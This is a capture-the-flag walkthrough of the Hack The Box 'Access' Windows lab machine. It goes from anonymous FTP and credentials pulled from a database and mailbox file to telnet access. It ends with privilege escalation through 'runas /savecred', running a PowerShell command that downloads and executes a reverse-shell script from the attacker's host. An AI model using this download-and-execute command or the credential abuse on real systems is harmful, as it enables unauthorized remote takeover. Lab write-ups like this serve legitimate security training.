---
tags: 
group: Windows
---
![](https://labs.hackthebox.com/storage/avatars/adef7ad3d015a1fbc5235d5a201ca7d1.png)

- Machine : https://app.hackthebox.com/machines/Access
- Reference : https://0xdf.gitlab.io/2019/03/02/htb-access.html
- Solved : 2024.12.07. (Sat) (Takes 1days)

## Summary
---


### Key Techniques:


---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.10.98
Performing quick port scan on 10.10.10.98...
Found open ports: 21,23,80
Performing detailed scan on 10.10.10.98...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-07 03:32 EST
Nmap scan report for 10.10.10.98
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.91 seconds
```

- 3 ports are open : ftp(21), telnet(23), http(80)
- ftp(21) allows anonymous login.
- Let's take a look at the ftp service first.

### ftp(21)

Let's try anonymous login first.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ftp anonymous@10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
```

There are two directories existing : `Backups`, `Engineer`
Let's download files.

```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ ftp anonymous@10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service

ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |******************************|  5520 KiB  469.04 KiB/s    00:00 ETA
226 Transfer complete.

ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |******************************| 10870       28.59 KiB/s    00:00 ETA
226 Transfer complete.
```

Downloaded two files : `backup.mdb`, `Access Control.zip`

```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ file backup.mdb 
backup.mdb: Microsoft Access Database


┌──(kali㉿kali)-[~/htb/ftp]
└─$ 7z x AccessControl.zip

7-Zip 24.07 (arm64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
 64-bit arm_v:8-A locale=C.UTF-8 Threads:4 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: AccessControl.zip
--
Path = AccessControl.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
```

`backup.mdb` file is an Microsoft Access Database file which might software or binary to analyze this file.
Also, `AccessControl.zip` file requires password to be unzipped.


# Extract Credentials from `backup.mdb`

`mdb-tools` is a set of tools for Microsoft Access Database.
Let's install and investigate the file.

```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ mdb-ver backup.mdb                       
JET4


┌──(kali㉿kali)-[~/htb/ftp]
└─$ mdb-tables backup.mdb | tr ' ' '\n'
acc_antiback
acc_door
acc_firstopen
acc_firstopen_emp
acc_holidays
acc_interlock
acc_levelset
acc_levelset_door_group
acc_linkageio
acc_map
acc_mapdoorpos
acc_morecardempgroup
acc_morecardgroup
acc_timeseg
acc_wiegandfmt
ACGroup
acholiday
ACTimeZones
action_log
AlarmLog
areaadmin
att_attreport
att_waitforprocessdata
attcalclog
attexception
AuditedExc
auth_group_permissions
auth_message
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
base_additiondata
base_appoption
base_basecode
base_datatranslation
base_operatortemplate
base_personaloption
base_strresource
base_strtranslation
base_systemoption
CHECKEXACT
CHECKINOUT
dbbackuplog
DEPARTMENTS
deptadmin
DeptUsedSchs
devcmds
devcmds_bak
django_content_type
django_session
EmOpLog
empitemdefine
EXCNOTES
FaceTemp
iclock_dstime
iclock_oplog
iclock_testdata
iclock_testdata_admin_area
iclock_testdata_admin_dept
LeaveClass
LeaveClass1
Machines
NUM_RUN
NUM_RUN_DEIL
operatecmds
personnel_area
personnel_cardtype
personnel_empchange
personnel_leavelog
ReportItem
SchClass
SECURITYDETAILS
ServerLog
SHIFT
TBKEY
TBSMSALLOT
TBSMSINFO
TEMPLATE
USER_OF_RUN
USER_SPEDAY
UserACMachines
UserACPrivilege
USERINFO
userinfo_attarea
UsersMachines
UserUpdates
worktable_groupmsg
worktable_instantmsg
worktable_msgtype
worktable_usrmsg
ZKAttendanceMonthStatistics
acc_levelset_emp
acc_morecardset
ACUnlockComb
AttParam
auth_group
AUTHDEVICE
base_option
dbapp_viewmodel
FingerVein
devlog
HOLIDAYS
personnel_issuecard
SystemLog
USER_TEMP_SCH
UserUsedSClasses
acc_monitor_log
OfflinePermitGroups
OfflinePermitUsers
OfflinePermitDoors
LossCard
TmpPermitGroups
TmpPermitUsers
TmpPermitDoors
ParamSet
acc_reader
acc_auxiliary
STD_WiegandFmt
CustomReport
ReportField
BioTemplate
FaceTempEx
FingerVeinEx
TEMPLATEEx
```

Among tables, `auth_user` looks interesting.
Let's export this.

```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ mdb-export backup.mdb auth_user > auth_user.csv

┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat auth_user.csv 
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

This file contains 3 credentials.
- `admin` : `admin`
- `engineer` : `access4u@security`
- `backup_admin` : `admin`

Just in case if there's any other useful tabes, I crafted a script to iterate through all tables and save if there's any data in it.

```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat export.sh 
#!/bin/bash

# Define input database and tables file
DATABASE="backup.mdb"
TABLES_FILE="tables"

# Loop through each table name in the tables file
while IFS= read -r table; do
    OUTPUT_FILE="${table}.csv"

    # Export the table to a CSV file
    mdb-export "$DATABASE" "$table" > "$OUTPUT_FILE"

    # Check if the file has more than 2 lines
    if [[ $(wc -l < "$OUTPUT_FILE") -gt 2 ]]; then
        echo "File kept: $OUTPUT_FILE"
    else
        # Remove the file if it has 2 lines or fewer
        rm "$OUTPUT_FILE"
    fi
done < "$TABLES_FILE"
```

```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ chmod +x export.sh 
                                                                           
┌──(kali㉿kali)-[~/htb/ftp]
└─$ ./export.sh 
File kept: acc_wiegandfmt.csv
File kept: ACGroup.csv
File kept: action_log.csv
File kept: areaadmin.csv
File kept: auth_user.csv
File kept: DEPARTMENTS.csv
File kept: deptadmin.csv
File kept: LeaveClass.csv
File kept: LeaveClass1.csv
File kept: TBKEY.csv
File kept: USERINFO.csv
File kept: ACUnlockComb.csv
File kept: AttParam.csv
```

Let's see all tables

```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat acc_wiegandfmt.csv
id,change_operator,change_time,create_operator,create_time,delete_operator,delete_time,status,wiegand_name,wiegand_count,odd_start,odd_count,even_start,even_count,cid_start,cid_count,comp_start,comp_count
12,,,,,,,1,"AutoMatchWiegandFmt",0,0,0,0,0,0,0,0,0
13,,,,,,,2,"SRBOn",0,0,0,0,0,0,0,0,0
14,,,,,,,2,"Wiegand26",0,0,0,0,0,0,0,0,0
15,,,,,,,2,"Wiegand26a",0,0,0,0,0,0,0,0,0
16,,,,,,,2,"Wiegand34",0,0,0,0,0,0,0,0,0
17,,,,,,,2,"Wiegand34a",0,0,0,0,0,0,0,0,0
18,,,,,,,2,"Wiegand36",0,0,0,0,0,0,0,0,0
19,,,,,,,2,"Wiegand37",0,0,0,0,0,0,0,0,0
20,,,,,,,2,"Wiegand37a",0,0,0,0,0,0,0,0,0
21,,,,,,,2,"Wiegand50",0,0,0,0,0,0,0,0,0
22,,,,,,,2,"Wiegand66",0,0,0,0,0,0,0,0,0


┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat ACGroup.csv       
GroupID,Name,TimeZone1,TimeZone2,TimeZone3,holidayvaild,verifystyle
1,,0,0,0,0,
2,,0,0,0,0,
3,,0,0,0,0,
4,,0,0,0,0,
5,,0,0,0,0,


┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat ACGroup.csv       
GroupID,Name,TimeZone1,TimeZone2,TimeZone3,holidayvaild,verifystyle
1,,0,0,0,0,
2,,0,0,0,0,
3,,0,0,0,0,
4,,0,0,0,0,
5,,0,0,0,0,


┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat action_log.csv
id,action_time,user_id,content_type_id,object_id,object_repr,action_flag,change_message
1044,"08/22/18 21:30:38",0,3,0,"AccTimeseg",3,"Time Zone Edit24-Hour Accessible"
1045,"08/22/18 21:31:13",0,3,0,"AuthUser",1,"Add Personneladmin"
1046,"08/22/18 21:31:14",0,3,0,"AuthUser",3,"Modify Personneladmin"
1047,"08/22/18 21:31:14",0,3,0,"AuthUser",3,"Modify Personneladmin"
1048,"08/22/18 21:35:27",25,3,0,"UserInfo",1,"Add Personnel538"
1049,"08/22/18 21:36:23",25,3,0,"Departments",1,"Add DepartmentIT"
1050,"08/22/18 21:36:30",25,3,0,"Departments",1,"Add DepartmentFinance"
1051,"08/22/18 21:36:37",25,3,0,"Departments",1,"Add DepartmentSales"
1052,"08/22/18 21:36:51",25,3,0,"UserInfo",3,"Personnel Changes538"
1053,"08/22/18 21:36:52",25,3,0,"AccLevelsetEmp",2,"Delete personnel permissions information"
1054,"08/22/18 21:39:49",25,3,0,"UserInfo",3,"Personnel Changes538"
1055,"08/22/18 21:39:49",25,3,0,"AccLevelsetEmp",2,"Delete personnel permissions information"
1056,"08/22/18 21:42:58",25,3,0,"AuthUser",1,"Add Personnelengineer1"
1057,"08/22/18 21:44:44",25,3,0,"UserInfo",1,"Add Personnel511"
1058,"08/22/18 21:47:01",25,3,0,"UserInfo",1,"Add Personnel502"
1059,"08/22/18 21:48:45",25,3,0,"UserInfo",1,"Add Personnel505"
1060,"08/23/18 21:11:47",0,3,0,"AuthUser",3,"Modify Personneladmin"
1061,"08/23/18 21:12:22",25,3,0,"AuthUser",2,"Delete Personnel26"
1062,"08/23/18 21:13:36",25,3,0,"AuthUser",1,"Add Personnelengineer"
1063,"08/23/18 21:14:02",25,3,0,"AuthUser",1,"Add Personnelbackup_admin"
1064,"08/23/18 21:15:34",25,3,0,"UserInfo",1,"Add Personnel510"
1065,"08/23/18 21:15:58",25,3,0,"Departments",1,"Add DepartmentExecutive"
1066,"08/23/18 21:16:19",25,3,0,"UserInfo",3,"Personnel Changes510"
1067,"08/23/18 21:16:19",25,3,0,"AccLevelsetEmp",2,"Delete personnel permissions information"


┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat areaadmin.csv 
id,user_id,area_id
22,22,44
23,23,43
24,23,47


┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat DEPARTMENTS.csv 
DEPTID,DEPTNAME,SUPDEPTID,InheritParentSch,InheritDeptSch,InheritDeptSchClass,AutoSchPlan,InLate,OutEarly,InheritDeptRule,MinAutoSchInterval,RegisterOT,DefaultSchId,ATT,Holiday,OverTime,change_operator,change_time,create_operator,create_time,delete_operator,delete_time,status,code,type,invalidate
1,"Company Name",0,,,,,,,,,,,,,,,,,,,,,"1",,
47,"IT",1,0,0,0,0,0,0,0,24,0,1,0,0,0,,,"25",,,,0,"03",,
48,"Finance",1,0,0,0,0,0,0,0,24,0,1,0,0,0,,,"25",,,,0,"02",,
49,"Sales",1,0,0,0,0,0,0,0,24,0,1,0,0,0,,,"25",,,,0,"01",,
50,"Executive",1,0,0,0,0,0,0,0,24,0,1,0,0,0,,,"25",,,,0,"04",,


┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat deptadmin.csv  
id,user_id,dept_id
34,23,21
35,23,3
36,23,5
43,22,24
44,22,21
45,22,5
46,22,22


┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat LeaveClass.csv
LeaveId,LeaveName,MinUnit,Unit,RemaindProc,RemaindCount,ReportSymbol,Deduct,Color,Classify,Code
1,"Sick",1,1,1,1,"B",0,3398744,,"Leave_1         "
2,"Vacation",1,1,1,1,"S",0,8421631,,"Leave_2         "
3,"Other",1,1,1,1,"T",0,16744576,,"Leave_3         "


<SNIP>
```

Except `auth_user` table, there's no other useful information...
Now, let's test if any of the found credentials are working on `ftp` login...

```perl
┌──(kali㉿kali)-[~/htb/ftp]
└─$ ftp admin@10.10.10.98    
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Password required for admin.
Password: 
530 User cannot log in.
ftp> quit
221 Goodbye.
                                                                           
┌──(kali㉿kali)-[~/htb/ftp]
└─$ ftp engineer@10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Password required for engineer.
Password: 
530 User cannot log in.
ftp: Login failed
ftp> quit
221 Goodbye.
                                                                           
┌──(kali㉿kali)-[~/htb/ftp]
└─$ ftp backup_admin@10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Password required for backup_admin.
Password: 
530 User cannot log in.
ftp: Login failed
ftp> quit
221 Goodbye.
```

None of them are working.. Maybe I have to use the credential in other place..

### telnet(23)

Let's try found credentials on `telnet` service.

```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ telnet 10.10.10.98      
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: admin
password: 
The handle is invalid.

Login Failed

login: engineer
password: 
The handle is invalid.

Login Failed

login: backup_admin
password: 
The handle is invalid.

Access Denied: Specified user is not a member of TelnetClients group.
Server administrator must add this user to the above group.

Telnet Server has closed the connection
Connection closed by foreign host.

```

None of them are working..
Maybe these credentials are not for `telnet` service.

Wait.. I forgot the `zip` file I found before : `Access Control.zip`
Let's revisit this again..


# Shell as `security`

Let's use the found password to unzip it.

```bash
┌──(kali㉿kali)-[~/htb/ftp/AccessControl]
└─$ 7z x AccessControl.zip

7-Zip 24.07 (arm64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
 64-bit arm_v:8-A locale=C.UTF-8 Threads:4 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: AccessControl.zip
--
Path = AccessControl.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870



┌──(kali㉿kali)-[~/htb/ftp/AccessControl]
└─$ ls -al
total 288
drwxrwxr-x 2 kali kali   4096 Dec  7 04:43  .
drwxrwxr-x 3 kali kali   4096 Dec  7 04:40  ..
-rw-rw-r-- 1 kali kali 271360 Aug 23  2018 'Access Control.pst'
-rw-rw-r-- 1 kali kali  10870 Aug 23  2018  AccessControl.zip
```

`pst` file has been extracted.

To investigate this file, I need `pst-utils`. Let's install it.

```bash
┌──(kali㉿kali)-[~/htb/ftp/AccessControl]
└─$ sudo apt update && sudo apt install libpst4 pst-utils

<SNIP>
```

Then, let's read the `pst` file using this tool.

```bash
┌──(kali㉿kali)-[~/htb/ftp/AccessControl]
└─$ readpst -o access_control_pst -r Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.


┌──(kali㉿kali)-[~/…/ftp/AccessControl/access_control_pst/Access Control]
└─$ file mbox                
mbox: HTML document, Unicode text, UTF-8 text, with very long lines (516)
                                                                           
┌──(kali㉿kali)-[~/…/ftp/AccessControl/access_control_pst/Access Control]
└─$ cat mbox        
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-1607055428_-_-"


----boundary-LibPST-iamunique-1607055428_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-1607055428_-_-"

--alt---boundary-LibPST-iamunique-1607055428_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-1607055428_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
        {mso-style-priority:99;
        color:#0563C1;
        text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
        {mso-style-priority:99;
        color:#954F72;
        text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
        {mso-style-name:msonormal;
        mso-margin-top-alt:auto;
        margin-right:0in;
        mso-margin-bottom-alt:auto;
        margin-left:0in;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
span.EmailStyle18
        {mso-style-type:personal-compose;
        font-family:"Calibri",sans-serif;
        color:windowtext;}
.MsoChpDefault
        {mso-style-type:export-only;
        font-size:10.0pt;
        font-family:"Calibri",sans-serif;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-1607055428_-_---

----boundary-LibPST-iamunique-1607055428_-_---
```

It contains valuable information regarding new credential!
The password for `security` has been changed to `4Cc3ssC0ntr0ller`

Let's test this credential to `ftp` and `telnet` service both.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ftp security@10.10.10.98     
Connected to 10.10.10.98.
220 Microsoft FTP Service
331 Password required for security.
Password: 
530 User cannot log in.
ftp: Login failed
ftp> exit
221 Goodbye.
                                                                           
┌──(kali㉿kali)-[~/htb]
└─$ telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```


# Shell as `Administrator`

### Enumeration

First, I tried `winPEAS` to automate enumeraiton.. But it was blocked.

```bash
C:\Users\security\Documents>.\winPEASx64.exe
This program is blocked by group policy. For more information, contact your system administrator.
```

Instead, I tried to fetch `Public`'s Desktop directory, and found interesting file.

```bash
C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public\Desktop

08/22/2018  09:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)   3,314,831,360 bytes free
```

`ZKAccess3.5 Security System.lnk` is in `Desktop` folder.
Let's check its ACL.

```vbnet
C:\Users\Public\Desktop>icacls "ZKAccess3.5 Security System.lnk"
ZKAccess3.5 Security System.lnk BUILTIN\Administrators:(I)(F)

NT AUTHORITY\INTERACTIVE:(I)(RX)
NT AUTHORITY\SYSTEM:(I)(F)
ACCESS\Administrator:(I)(DE,DC)

Successfully processed 1 files; Failed processing 0 files
```

Let's open and read what's in it.

```bash
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
                                                                        �wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
                                 O�j)�H���
                                          )ΰ[�_���8{E�3
                                                       O�j)�H���
                                                                )ΰ[�    ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
```

There's a command line : `runas.exe C:\ZKTeco\ZKAccess3.5G /user:ACCESS\Administrator /savecred`

Let's check the executed binary : `ZKAccess3.5G`

```bash
C:\Users\Public\Desktop>icacls "C:\ZKTeco\ZKAccess3.5"
C:\ZKTeco\ZKAccess3.5 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)

BUILTIN\Administrators:(I)(OI)(CI)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
BUILTIN\Users:(I)(CI)(AD)
BUILTIN\Users:(I)(CI)(WD)
CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

Let's see if there's any saved credential:

```bash
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

Target: Domain:interactive=ACCESS\Administrator
Type: Domain Password
User: ACCESS\Administrator
```

As expected, there exists a saved credential for `administrator`.
Let's use it to spawn a reverse shell.
I prepared `Invoke-PowerShellTcp.ps1` and saved it as `shell.ps1`.

Let's open a web server to upload payload.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ python -m http.server                      
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.98 - - [07/Dec/2024 05:55:57] "GET /shell.ps1 HTTP/1.1" 200 -
```

Then, let's use `runas /savecred` to download and run the payload.

```powershell
C:\Users\security\Documents>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14:8000/shell.ps1')"
```

Then, reverse shell connection is established.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.98] 49165
Windows PowerShell running as user Administrator on ACCESS                  
Copyright (C) 2015 Microsoft Corporation. All rights reserved.              

PS C:\Windows\system32>whoami
access\administrator
```

I got `administrator`.

Another approach using `mimikatz` is illustrated in **0xdf's blog posting**.